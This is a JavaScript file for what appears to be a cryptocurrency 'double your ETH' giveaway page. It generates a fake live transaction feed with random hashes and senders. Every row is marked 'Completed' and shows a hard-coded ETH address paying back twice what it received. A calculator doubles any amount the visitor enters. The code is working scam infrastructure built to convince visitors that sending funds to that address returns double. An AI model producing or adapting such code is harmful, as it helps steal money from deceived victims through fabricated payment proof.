$(document).ready(function () {
    function randomString(len, charSet) {
        charSet = charSet || "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
        var randomString = "";
        for (var i = 0; i < len; i++) {
            var randomPoz = Math.floor(Math.random() * charSet.length);
            randomString += charSet.substring(randomPoz, randomPoz + 1);
        }
        return randomString;
    }

    function randomInteger(min, max) {
        let rand = min + Math.random() * (max + 1 - min);
        return Math.floor(rand);
    }

    function createTableItem() {
      
            var coin = "ETH";
            var address ="0x50EDD85ab6c59AF1Ce22FaB6bACA2919B411e53B";
            var inputValue = randomInteger(0,9) + "." + randomString(5, "123456789");
        

        let outputValue = ++inputValue * 2;
        let fee = inputValue / 10000;

        let row = `<div class="transaction-item">
                <p class="txhash">${randomString(25) + "..."}</p>
                <p class="block">${randomString(6, "123456789")}</p>
                <p class="from">${"0x"+randomString(25) + "..."}<br><span>${address}</span></p>
                <div class="arrow"><img src="image/arrow.svg" alt=""></div>
                <p class="to"><span>${address}</span><br>${"0x"+randomString(25) + "..."}</p>
                <p class="value"> ${round(inputValue, 7)} ${coin}<br>${round(outputValue, 7)} ${coin}</p>
                <p class="fee">${round(fee, 5)}</p>
                <p class="status">Completed</p>
            </div>`;
        $(row).hide().prependTo(".transaction-content").fadeIn("slow");
        $('.transaction-item:eq(5)').remove();
    }

    createTableItem();
    createTableItem();
    createTableItem();
    createTableItem();
    createTableItem();
    var time=randomInteger(1000,8000);
    setInterval(createTableItem, time);

    $('a[href^="#"]').click(function () {
        var target = $(this).attr('href');
        $('html, body').animate({scrollTop: $(target).offset().top - 50}, 500);
        return false;
    });

    $("input[name=input]").ForceNumericOnly().keyup(function () {
        let amount = parseFloat($(this).val().replaceAll(/\D/g, ""));
        amount = !isNaN(amount) ? amount * 2 : 0;
        $("#calculator_number").text(amount.toLocaleString());
    });

    $(".participate-button").click(function () {
        $(this).parents(".participate-item").find(".address-done").fadeIn(200);
        setTimeout(() => $(this).parents(".participate-item").find(".address-done").fadeOut(200), 1000);
    });
});

function round(value, decimals) {
    return Number(Math.round(value + 'e' + decimals) + 'e-' + decimals);
}

function copy(text) {
    var input = document.createElement('textarea');
    input.innerHTML = text;
    document.body.appendChild(input);
    input.select();
    var status = document.execCommand('copy');
    document.body.removeChild(input);
}

jQuery.fn.ForceNumericOnly = function () {
    return this.each(function () {
        $(this).keydown(function (e) {
            var key = e.charCode || e.keyCode || 0;
            return (key == 8 || key == 46 || key == 190 || (key >= 35 && key <= 40) || (key >= 48 && key <= 57) || (key >= 96 && key <= 105));
        });
    });
};
